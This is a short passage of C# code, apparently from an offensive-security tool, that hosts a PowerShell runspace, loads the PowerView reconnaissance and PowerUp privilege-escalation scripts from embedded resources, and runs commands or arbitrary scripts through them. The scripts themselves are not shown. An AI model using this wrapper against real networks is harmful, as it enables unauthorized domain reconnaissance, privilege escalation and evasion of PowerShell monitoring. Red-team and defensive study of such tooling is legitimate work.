            pipeline.Commands.AddScript(Resources.Invoke_PowerView());
            pipeline.Commands.AddScript(Resources.Invoke_PowerUp());
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString();
        }

        public static void RunPSFile(string script)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript(script).Invoke();
        }
    }

}
